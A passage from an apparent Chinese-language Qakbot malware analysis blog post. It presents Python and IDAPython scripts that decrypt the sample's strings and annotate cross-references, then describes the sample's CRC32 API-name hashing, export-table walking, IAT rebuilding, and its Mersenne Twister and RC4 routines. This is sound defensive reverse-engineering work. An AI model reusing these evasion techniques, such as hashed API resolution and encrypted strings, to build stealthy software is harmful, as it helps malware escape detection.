index2):<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> decopded_buf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">filepath</span>):<br>    pe = pefile.PE(filepath)<br>    <span class="hljs-keyword">for</span> section <span class="hljs-keyword">in</span> pe.sections:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;.data&#x27;</span> <span class="hljs-keyword">in</span> section.Name.decode(encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span>).rstrip(<span class="hljs-string">&#x27;x00&#x27;</span>):<br>                <span class="hljs-keyword">return</span> (section.get_data(section.VirtualAddress, section.SizeOfRawData))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_offsets</span>(<span class="hljs-params">s_seg_start, x_start</span>):<br>    data_offset = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(x_start, <span class="hljs-number">16</span>) - <span class="hljs-built_in">int</span>(s_seg_start, <span class="hljs-number">16</span>))<br>    <span class="hljs-keyword">return</span> data_offset<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">string_decrypter</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, data_seg_start, encrypted_string_addr, key_data_addr</span>):<br>    <span class="hljs-comment"># 两个缓冲区</span><br>    data_1 = <span class="hljs-string">b&#x27;&#x27;</span><br>    data_2 = <span class="hljs-string">b&#x27;&#x27;</span><br><br>    <span class="hljs-comment"># 计算偏移</span><br>    encrypted_string_addr_rel = calc_offsets(data_seg_start, encrypted_string_addr)<br>    key_data_addr_rel = calc_offsets(data_seg_start, key_data_addr)<br><br>    <span class="hljs-comment"># 获取.data数据</span><br>    filepath = <span class="hljs-string">r&quot;C:\\Users\\yuanmingfei\\Desktop\\mas_2\\mas_2_dump.bin &quot;</span><br>    data_encoded_extracted_1 = extract_data(filepath)<br>    data_encoded_extracted_2 = extract_data(filepath)<br><br>    <span class="hljs-comment"># 计算data和key的终止偏移</span><br>    d1_off = <span class="hljs-number">0x0</span><br>    d2_off = <span class="hljs-number">0x0</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">b&#x27;\x00\x00&#x27;</span> <span class="hljs-keyword">in</span> data_encoded_extracted_1[<span class="hljs-built_in">int</span>(encrypted_string_addr_rel, <span class="hljs-number">16</span>): ]):<br>        d1_off = (data_encoded_extracted_1[<span class="hljs-built_in">int</span>(encrypted_string_addr_rel, <span class="hljs-number">16</span>): ]).index(<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">b&#x27;\x00\x00&#x27;</span> <span class="hljs-keyword">in</span> data_encoded_extracted_2[<span class="hljs-built_in">int</span>(key_data_addr_rel, <span class="hljs-number">16</span>): ]):<br>        d2_off = (data_encoded_extracted_2[<span class="hljs-built_in">int</span>(key_data_addr_rel, <span class="hljs-number">16</span>): ]).index(<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br><br>    <span class="hljs-comment"># 提取data和key</span><br>    data_1 = data_encoded_extracted_1[<span class="hljs-built_in">int</span>(encrypted_string_addr_rel, <span class="hljs-number">16</span>): <span class="hljs-built_in">int</span>(encrypted_string_addr_rel, <span class="hljs-number">16</span>) + d1_off]<br>    data_2 = data_encoded_extracted_2[<span class="hljs-built_in">int</span>(key_data_addr_rel, <span class="hljs-number">16</span>): <span class="hljs-built_in">int</span>(key_data_addr_rel, <span class="hljs-number">16</span>) + d2_off]<br><br>    <span class="hljs-comment"># 解密数据</span><br>    <span class="hljs-built_in">print</span>(decrypter(<span class="hljs-built_in">id</span>, data_1, data_2))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    string_decrypter(<span class="hljs-number">708</span>, <span class="hljs-string">&#x27;0x1001D000&#x27;</span>, <span class="hljs-string">&#x27;0x1001D0B0&#x27;</span>, <span class="hljs-string">&#x27;0x1001D050&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h4 id="3-1-2-编写IDA脚本实现自动注释"><a href="#3-1-2-编写IDA脚本实现自动注释" class="headerlink" title="3.1.2 编写IDA脚本实现自动注释"></a>3.1.2 编写IDA脚本实现自动注释</h4><p>交叉引用后发现，大量位置使用该函数来解密字符串，编写IDA脚本实现自动对引用位置添加注释：</p><p>经过查看参数传递，发现大多数情况index均使用ecx以及push指令传参，并在距离call指令1-2个指令处，脚本遍历解密函数的全部交叉引用，并提取指令中的立即数作为index来解密字符串，再对当前位置添加注释。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pydoc <span class="hljs-keyword">import</span> doc<br><span class="hljs-keyword">import</span> pefile<br><span class="hljs-keyword">import</span> idaapi<br><span class="hljs-keyword">import</span> idautils<br><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypter</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, data_string, data_key</span>):<br>    size = <span class="hljs-number">3660</span><br>    index = <span class="hljs-built_in">id</span><br>    index2 = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-built_in">id</span> &lt; size ):<br>        flag = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">if</span>(data_key[index % <span class="hljs-number">0x5A</span>] == data_string[index]):<br>                <span class="hljs-keyword">break</span><br>            index += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span>(index &gt;= size):<br>                flag = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span>(flag == <span class="hljs-literal">False</span>):<br>            index2 = index - <span class="hljs-built_in">id</span><br><br>    decopded_buf = <span class="hljs-string">&#x27;&#x27;</span><br>    index = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span>(index2 != <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            decopded_buf += <span class="hljs-built_in">chr</span>((data_string[<span class="hljs-built_in">id</span>]) ^ (data_key[<span class="hljs-built_in">id</span> % <span class="hljs-number">0x5A</span>]))<br>            <span class="hljs-built_in">id</span> += <span class="hljs-number">1</span><br>            index += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span>(index &gt;= index2):<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> decopded_buf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">filepath</span>):<br>    pe = pefile.PE(filepath)<br>    <span class="hljs-keyword">for</span> section <span class="hljs-keyword">in</span> pe.sections:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;.data&#x27;</span> <span class="hljs-keyword">in</span> section.Name.decode(encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span>).rstrip(<span class="hljs-string">&#x27;x00&#x27;</span>):<br>                <span class="hljs-keyword">return</span> (section.get_data(section.VirtualAddress, section.SizeOfRawData))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_offsets</span>(<span class="hljs-params">s_seg_start, x_start</span>):<br>    data_offset = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(x_start, <span class="hljs-number">16</span>) - <span class="hljs-built_in">int</span>(s_seg_start, <span class="hljs-number">16</span>))<br>    <span class="hljs-keyword">return</span> data_offset<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">string_decrypter</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, encrypted_string_addr, key_data_addr</span>):<br>    <span class="hljs-comment"># 两个缓冲区</span><br>    data_1 = <span class="hljs-string">b&#x27;&#x27;</span><br>    data_2 = <span class="hljs-string">b&#x27;&#x27;</span><br><br>    encrypted_string_addr_ref = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(encrypted_string_addr))<br>    key_data_addr_ref = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(key_data_addr))<br><br>    <span class="hljs-comment"># 获取.data地址</span><br>    <span class="hljs-keyword">for</span> segment <span class="hljs-keyword">in</span> idautils.Segments():<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;.data&#x27;</span> == idc.get_segm_name(segment):<br>            data_seg_start = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(idc.get_segm_start(segment)))<br><br>    <span class="hljs-comment"># 计算偏移</span><br>    encrypted_string_addr_rel = calc_offsets(data_seg_start, encrypted_string_addr_ref)<br>    key_data_addr_rel = calc_offsets(data_seg_start, key_data_addr_ref)<br><br>    <span class="hljs-comment"># 获取.data数据</span><br>    filepath = <span class="hljs-string">r&quot;C:\\Users\\yuanmingfei\\Desktop\\mas_2\\mas_2_dump.bin&quot;</span><br>    data_encoded_extracted_1 = extract_data(filepath)<br>    data_encoded_extracted_2 = extract_data(filepath)<br><br>    <span class="hljs-comment"># 计算data和key的终止偏移</span><br>    d1_off = <span class="hljs-number">0x0</span><br>    d2_off = <span class="hljs-number">0x0</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">b&#x27;\x00\x00&#x27;</span> <span class="hljs-keyword">in</span> data_encoded_extracted_1[<span class="hljs-built_in">int</span>(encrypted_string_addr_rel, <span class="hljs-number">16</span>): ]):<br>        d1_off = (data_encoded_extracted_1[<span class="hljs-built_in">int</span>(encrypted_string_addr_rel, <span class="hljs-number">16</span>): ]).index(<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">b&#x27;\x00\x00&#x27;</span> <span class="hljs-keyword">in</span> data_encoded_extracted_2[<span class="hljs-built_in">int</span>(key_data_addr_rel, <span class="hljs-number">16</span>): ]):<br>        d2_off = (data_encoded_extracted_2[<span class="hljs-built_in">int</span>(key_data_addr_rel, <span class="hljs-number">16</span>): ]).index(<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br><br>    <span class="hljs-comment"># 提取data和key</span><br>    data_1 = data_encoded_extracted_1[<span class="hljs-built_in">int</span>(encrypted_string_addr_rel, <span class="hljs-number">16</span>): <span class="hljs-built_in">int</span>(encrypted_string_addr_rel, <span class="hljs-number">16</span>) + d1_off]<br>    data_2 = data_encoded_extracted_2[<span class="hljs-built_in">int</span>(key_data_addr_rel, <span class="hljs-number">16</span>): <span class="hljs-built_in">int</span>(key_data_addr_rel, <span class="hljs-number">16</span>) + d2_off]<br><br>    <span class="hljs-comment"># 解密数据</span><br>    decryped = decrypter(<span class="hljs-built_in">id</span>, data_1, data_2)<br><br>    <span class="hljs-comment"># 拼接注释</span><br>    comment = (<span class="hljs-string">&quot;string[%d]: %s&quot;</span> % (<span class="hljs-built_in">id</span>, decryped))<br><br>    <span class="hljs-keyword">return</span> comment<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_decompiler_comments</span>(<span class="hljs-params">addr, comment</span>):<br>    c_function = idaapi.decompile(addr)<br>    treeloc_struct = idaapi.treeloc_t()<br>    treeloc_struct.ea = addr<br>    treeloc_struct.itp = idaapi.ITP_SEMI<br>    <span class="hljs-keyword">if</span> c_function:<br>        c_function.set_user_cmt(treeloc_struct, comment)<br>        c_function.save_user_cmts()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">comment_string_offset</span>(<span class="hljs-params">encrypted_string_addr, key_data_addr, fun_offset</span>):<br>    <span class="hljs-comment"># 获取线性地址</span><br>    str_function = idc.get_name_ea_simple(fun_offset)<br>    <span class="hljs-comment"># 遍历函数交叉引用</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> idautils.CodeRefsTo(str_function, <span class="hljs-number">0</span>):<br>        <span class="hljs-comment"># 获取前一条指令地址</span><br>        p = idc.prev_head(k)<br>        <span class="hljs-comment"># 获取地址处的反汇编</span><br>        my = idc.print_insn_mnem(p)<br>        <span class="hljs-keyword">if</span> my <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;mov&#x27;</span>, <span class="hljs-string">&#x27;push&#x27;</span>):<br>            <span class="hljs-keyword">if</span> my == <span class="hljs-string">&#x27;mov&#x27;</span>:<br>                <span class="hljs-comment"># 判断汇编操作数类型</span><br>                <span class="hljs-keyword">if</span> idc.get_operand_type(p, <span class="hljs-number">1</span>) == <span class="hljs-number">5</span>:<br>                    <span class="hljs-comment"># 获取操作数</span><br>                    str_off = <span class="hljs-built_in">int</span>(idc.print_operand(p, <span class="hljs-number">1</span>)[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>                    comment_string = string_decrypter(str_off, encrypted_string_addr, key_data_addr)<br>                    <span class="hljs-comment"># 添加注释</span><br>                    idc.set_cmt(k, comment_string, <span class="hljs-number">0</span>)<br>                    make_decompiler_comments(k, comment_string)<br>            <span class="hljs-keyword">if</span> my == <span class="hljs-string">&#x27;push&#x27;</span>:<br>                <span class="hljs-keyword">if</span> idc.get_operand_type(p, <span class="hljs-number">0</span>) == <span class="hljs-number">5</span>:<br>                    str_off = <span class="hljs-built_in">int</span>(idc.print_operand(p, <span class="hljs-number">0</span>)[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>                    comment_string = string_decrypter(str_off, encrypted_string_addr, key_data_addr)<br>                    idc.set_cmt(k, comment_string, <span class="hljs-number">0</span>)<br>                    make_decompiler_comments(k, comment_string)<br>            <span class="hljs-keyword">else</span>:<br>                j = idc.prev_head(p)<br>                my2 = idc.print_insn_mnem(j)<br>                <span class="hljs-keyword">if</span> my2 <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;mov&#x27;</span>, <span class="hljs-string">&#x27;push&#x27;</span>):<br>                    <span class="hljs-keyword">if</span> my2 == <span class="hljs-string">&#x27;mov&#x27;</span>:<br>                        <span class="hljs-keyword">if</span> idc.get_operand_type(j, <span class="hljs-number">1</span>) == <span class="hljs-number">5</span>:<br>                            str_off = <span class="hljs-built_in">int</span>(idc.print_operand(j, <span class="hljs-number">1</span>)[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>                            comment_string = string_decrypter(str_off, encrypted_string_addr, key_data_addr)<br>                            idc.set_cmt(k, comment_string, <span class="hljs-number">0</span>)<br>                            make_decompiler_comments(k, comment_string)<br>                    <span class="hljs-keyword">if</span> my2 == <span class="hljs-string">&#x27;push&#x27;</span>:<br>                        <span class="hljs-keyword">if</span> idc.get_operand_type(j, <span class="hljs-number">0</span>) == <span class="hljs-number">5</span>:<br>                            str_off = <span class="hljs-built_in">int</span>(idc.print_operand(j, <span class="hljs-number">0</span>)[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>                            comment_string = string_decrypter(str_off, encrypted_string_addr, key_data_addr)<br>                            idc.set_cmt(k, comment_string, <span class="hljs-number">0</span>)<br>                            make_decompiler_comments(k, comment_string)<br><br><br>comment_string_offset(<span class="hljs-number">0x1001D5A8</span>, <span class="hljs-number">0x1001E3F8</span>, <span class="hljs-string">&quot;decode_string_table_1_1&quot;</span>)<br>comment_string_offset(<span class="hljs-number">0x1001D5A8</span>, <span class="hljs-number">0x1001E3F8</span>, <span class="hljs-string">&quot;decode_string_table_1_2&quot;</span>)<br>comment_string_offset(<span class="hljs-number">0x1001D0B0</span>, <span class="hljs-number">0x1001D050</span>, <span class="hljs-string">&quot;decode_string_table_2_1&quot;</span>)<br>comment_string_offset(<span class="hljs-number">0x1001D0B0</span>, <span class="hljs-number">0x1001D050</span>, <span class="hljs-string">&quot;decode_string_table_2_2&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done!&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>执行结果如下：</strong></p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221011222115285.png" alt="自动注释脚本"></p><p>只有少部分使用寄存器间接传参的，其他的情况均可正常解析。</p><p><strong>使用到的ida_api如下：</strong></p><p><a href="https://www.hex-rays.com/products/ida/support/idapython_docs/ida_idaapi.html#ida_idaapi">ida_idaapi API documentation (hex-rays.com)</a></p><p><a href="https://hex-rays.com/products/ida/support/idapython_docs/idautils.html">idautils API documentation (hex-rays.com)</a></p><p><a href="https://hex-rays.com/products/ida/support/idapython_docs/idc.html">idc API documentation (hex-rays.com)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 头文件</span><br><span class="hljs-keyword">import</span> idaapi<br><span class="hljs-keyword">import</span> idautils<br><br><span class="hljs-comment"># 遍历节表</span><br><span class="hljs-keyword">for</span> segment <span class="hljs-keyword">in</span> idautils.Segments():<br>    <span class="hljs-comment"># 过滤节名字</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;.data&#x27;</span> == idc.get_segm_name(segment):<br>            <span class="hljs-comment"># 获取节首地址</span><br>            data_seg_start = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(idc.get_segm_start(segment)))<br>            <br><span class="hljs-comment"># 根据函数名获取函数地址</span><br>idc.get_name_ea_simple(func_name)<br><br><span class="hljs-comment"># 得到某个地址的交叉引用地址列表</span><br>idautils.CodeRefsTo(addr, <span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># 获取指定地址指令的上一条指令地址</span><br>idc.prev_head(addr)<br><br><span class="hljs-comment"># 获取地址处指令Opcode</span><br>idc.print_insn_mnem(addr)<br><br><span class="hljs-comment"># 获取地址处指令操作数（0: 操作数1；1：操作数2)</span><br>idc.get_operand_type(addr, <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 打印地址处的指令操作数（0: 操作数1；1：操作数2)</span><br>idc.print_operand(addr, <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 指定地址添加注释</span><br>idc.set_cmt(addr, comment, <span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># 伪代码指定地址的函数中添加注释</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_decompiler_comments</span>(<span class="hljs-params">addr, comment</span>):<br>    c_function = idaapi.decompile(addr)<br>    treeloc_struct = idaapi.treeloc_t()<br>    treeloc_struct.ea = addr<br>    treeloc_struct.itp = idaapi.ITP_SEMI<br>    <span class="hljs-keyword">if</span> c_function:<br>        c_function.set_user_cmt(treeloc_struct, comment)<br>        c_function.save_user_cmts()<br></code></pre></td></tr></table></figure><h3 id="3-2-处理动态解析API"><a href="#3-2-处理动态解析API" class="headerlink" title="3.2 处理动态解析API"></a>3.2 处理动态解析API</h3><h4 id="3-2-1-整体逻辑分析"><a href="#3-2-1-整体逻辑分析" class="headerlink" title="3.2.1 整体逻辑分析"></a>3.2.1 整体逻辑分析</h4><p>字符串解密函数不远处的sub_1000E369函数就是用来解析API的，代码如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221012102055748.png" alt="解析API"></p><p>pe文件可能包括导入dll，这个函数根据字符串解密结果来解析指定dll，并在堆中构建新的IAT表，将地址返回。</p><p><strong>整个解析过程如下图所示：</strong></p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221012103602891.png" alt="API动态解析逻辑图"></p><h4 id="3-2-2-Hash函数名还原"><a href="#3-2-2-Hash函数名还原" class="headerlink" title="3.2.2 Hash函数名还原"></a>3.2.2 Hash函数名还原</h4><p>经过分析，样本中有一块全局数据区，存放的是所有经过hash化的导入函数名，每个hash串长度为4字节，hash算法为crc32，代码如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221012101424916.png" alt="crc32"></p><p>hash使用的key为0x218FE95B，代码如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221012101523270.png" alt="hash_key">其中的0x218FE95B为hash算法用到的xor key，使用Hash DB插件来自动化解析hash数据，首先在插件中设置xor key，如下图所示：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221010154215406.png" alt="插件设置xor_key"></p><p>将参数的data转变成如下格式：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221010154621260.png" alt="hash_data"></p><p>对着4字节hash串，右键使用Hash DB来判断算法，如图所示：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221010154745559.png" alt="Hash DB判断算法"></p><p>选择算法后，再对这个hash串右键使用Hash DB的Lookup功能来解析，之后对连续的hash串使用Hash DB的Scan IAT即可，Hash DB会自动创建枚举类型，手动将名称全部恢复，如下图所示：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221010155527787.png" alt="恢复hash名称"></p><p>对着ma_decode_api函数按 ‘X’ 查看交叉引用，将其他位置的hash名称也恢复出来。</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221010155709309.png" alt="ma_decode_api交叉引用"></p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221010160843541.png" alt="hash函数名全部恢复"></p><h4 id="3-2-3-PE遍历导出表"><a href="#3-2-3-PE遍历导出表" class="headerlink" title="3.2.3 PE遍历导出表"></a>3.2.3 PE遍历导出表</h4><p>首先是初始化PE相关的表指针，代码如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221012104341676.png" alt="初始化PE指针"></p><p><strong>PE相关的IDA内置结构如下：</strong></p><p><a href="http://www.sunshine2k.de/reversing/tuts/tut_pe.htm">Sunshine’s Homepage - PE file format (sunshine2k.de)</a></p><ul><li><strong>_IMAGE_DOS_HEADER</strong></li><li><strong>_IMAGE_NT_HEADERS</strong></li><li><strong>_IMAGE_DATA_DIRECTORY</strong></li><li><strong>_IMAGE_EXPORT_DIRECTORY</strong></li><li><strong>_IMAGE_OPTIONAL_HEADER</strong></li><li><strong>_IMAGE_SECTION_HEADER</strong></li><li><strong>_IMAGE_IMPORT_DESCRIPTOR</strong></li></ul><p>遍历导出名字表，计算并比对hash，将得到的索引用来解析导出表三层结构获取导出函数地址，代码如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221012104505805.png" alt="遍历导出名字表"></p><p>根据导出函数地址判断是否为导出转发函数，代码如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221012104722485.png" alt="判断导出转发函数"></p><p><strong>PE导出转发函数：</strong></p><p>在一些系统dll中，如Kenel32.dll中的AddVectoredExceptionHandler()函数，实际上这个函数的真正代码为ntdll中的RtlAddVectoredExceptionHandler()，如下图所示：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221010170809287.png" alt="AddVectoredExceptionHandler转发"></p><p>此时Function RVA指向pe导出表的用于<strong>保存函数名字的内存区</strong>，并且数据格式如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">NTDLL.RtlAddVectoredExceptionHandler<br></code></pre></td></tr></table></figure><p>此时想要获取这个地址，就需要加载ntdll.dll并调用GetProcAddress来获取。</p><p>解析转发dll，加载，获取导出函数地址，代码如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221012104952560.png" alt="处理转发导出函数"></p><h4 id="3-2-4-生成IAT表"><a href="#3-2-4-生成IAT表" class="headerlink" title="3.2.4 生成IAT表"></a>3.2.4 生成IAT表</h4><p>函数将获取到的所有导入函数地址，用一块堆内存来保存（重构IAT表），并将堆首地址返回给上一级，函数如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221012105211603.png" alt="返回IAT表"></p><p>增强伪代码可读性，为之前得到的全局hash序列创建结构体，如图所示：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221010172822764.png" alt="创建api结构"></p><p>并将接收指针的全局变量全部重命名，并将类型修改为指定的结构体指针，如图所示：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221010173543546.png" alt="全局API表命名"></p><p>此时去到全局变量引用位置，代码可读性大大提升，对比如下：</p><p><strong>修复前：</strong></p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221012105838431.png" alt="解析API代码修复前"></p><p><strong>修复后：</strong></p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221012105930028.png" alt="解析API代码修复后"></p><h3 id="3-3-加密算法识别"><a href="#3-3-加密算法识别" class="headerlink" title="3.3 加密算法识别"></a>3.3 加密算法识别</h3><h4 id="3-3-1-Mersenne-Twister"><a href="#3-3-1-Mersenne-Twister" class="headerlink" title="3.3.1 Mersenne Twister"></a>3.3.1 Mersenne Twister</h4><p>从一个随机字符串生成函数中识别一下MT伪随机数生成算法，函数（sub_1000B82D）代码如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221012161658614.png" alt="生成随机字符串函数"></p><p><strong>MT算法由几个部分组成：根据seed初始化状态函数、状态传递函数、根据状态生成随机数函数。</strong></p><p>初始化函数如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221012161107624.png" alt="MT初始化"></p><p>状态传递与生成随机数函数合在一起了，代码如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221012161304399.png" alt="生成随机数"></p><h4 id="3-3-2-RC4"><a href="#3-3-2-RC4" class="headerlink" title="3.3.2 RC4"></a>3.3.2 RC4</h4><p>在追网络通信ip地址来源的时候，发现了rc4相关的函数，其中初始化s_box函数代码如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221014115421824.png" alt="rc4_init"></p><p>rc4是异或加密，加密解密函数为同一个，代码如下：</p><p><img 